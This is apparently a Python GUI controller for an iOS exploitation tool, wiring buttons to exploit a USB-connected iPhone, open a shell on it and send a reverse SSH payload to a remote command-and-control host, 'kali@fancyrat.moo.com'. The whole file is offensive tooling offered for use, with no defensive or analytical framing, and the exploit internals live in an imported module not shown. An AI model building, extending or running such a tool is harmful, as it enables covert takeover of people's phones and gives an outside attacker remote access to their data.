#!/bin/python3

import exploit
import ui_setup
from time import sleep




checkrain = exploit.Checkrain()
checkrain.REMOTE_SSH_CC = 'kali@fancyrat.moo.com'
window = ui_setup.UI.window


keep_printing=True
while True:

    if window['-OUTPUT-'].DisplayText.count('\n') >= 14:
        window['-OUTPUT-'].DisplayText = window['-OUTPUT-'].DisplayText.split(
            '\n', maxsplit=1)[1]

    event, values = window.read(timeout=500)
    #print(event)
    if event == ui_setup.sg.WINDOW_CLOSED or event == 'Quit':
        checkrain.kill()
        checkrain.kill_inject()
        break

    if event == 'PWN' and checkrain.pid() is None and checkrain.isdone() is False:
        checkrain.pwn()
        #print(checkrain.pid())
        window['-OUTPUT-'].update(window['-OUTPUT-'].get() +
                                  "[*] Exploiting IOS device!\n", text_color='#0ab3d1')
        

    if event == 'Inject' and checkrain.pid() != None and checkrain.inject_pid() is None and checkrain.isdone() is False:
        try:
            checkrain.inject()
            window['-OUTPUT-'].update(window['-OUTPUT-'].get() +
                                      "[***] Openning shell over USB to IOS device.\n")
            try:
                window['-OUTPUT-'].update(window['-OUTPUT-'].get() +
                                          "[*] Sending Reverse SSH payload.....\n",)
                if checkrain.reverse_ssh() != True:
                    raise ValueError("payload_not_sent")
                else:
                    window['-OUTPUT-'].update(window['-OUTPUT-'].get() +
                                          "[***] Payload sent!!!\n")
            except ValueError:
                window['-OUTPUT-'].update(window['-OUTPUT-'].get() +
                                          "[!] Failed to send payload!\n")
                checkrain.kill_inject()
        except:
            window['-OUTPUT-'].update(window['-OUTPUT-'].get() +
                              "[!] Unable to open shell over USB on IOS device!\n")
            checkrain.kill_inject()
            pass

    if event == 'Reset':
        checkrain.kill()
        checkrain.kill_inject()
        
        window['-OUTPUT-'].update('', background_color='#2b2b2b')
    if keep_printing is True:
        if checkrain.isdone() is True:
            window['-OUTPUT-'].update(window['-OUTPUT-'].get() +
                                  "\n            ($$$$=====WIN====$$$$)\n\n", text_color='#28d1b5')
            window['-OUTPUT-'].update(window['-OUTPUT-'].get() +
                                      "          ͡° ͜ʖ ͡°\n\n", text_color='#28d1b5')
            keep_printing = False
        else:
            window['-OUTPUT-'].update(window['-OUTPUT-'].get() + checkrain.log.readline())
    else:
        pass


window.close()
